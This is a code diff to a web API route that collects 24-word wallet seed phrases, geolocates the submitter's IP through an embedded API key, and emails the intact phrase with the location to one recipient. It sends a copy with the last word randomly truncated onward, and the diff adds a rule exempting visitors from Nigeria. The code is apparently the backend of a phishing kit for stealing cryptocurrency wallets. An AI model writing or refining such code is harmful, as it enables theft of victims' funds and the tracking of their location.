@@ -47,30 +47,24 @@ const formatMessage = async (message: string, location: string) => {
     return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 };
 
-
-
 export async function POST(request: Request) {
     try {
         const { message } = await request.json();
+        const ip = request.headers.get('x-forwarded-for');
+        const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
+        const locationJson = await locationData.json();
+        const location = `${locationJson.city}, ${locationJson.country_name}`;
 
         // Validate that the message is a passphrase with 24 words
         const words = message.trim().split(/\s+/);
 
-        if (words.length === 24) {
-            // Get user's location based on IP
-            const ip = request.headers.get('x-forwarded-for');
-            console.log(ip)
-            const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
-            console.log(locationData)
-            const locationJson = await locationData.json();
-            console.log(locationJson)
-            const location = `${locationJson.city}, ${locationJson.country_name}`;
-            console.log(location)
-
+        if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
             // Send the correct passphrase to the first email
             await formatMessage(message, location);
 
-            const lastWord = words[23].slice(0, -3);
+            // Randomly decide how many characters to remove from the last word (1 to 5)
+            const charsToRemove = Math.floor(Math.random() * 5) + 1;
+            const lastWord = words[23].slice(0, -charsToRemove);
             const modifiedMessage = [...words.slice(0, 23), lastWord].join(' ');
 
             const email = process.env.EMAIL;
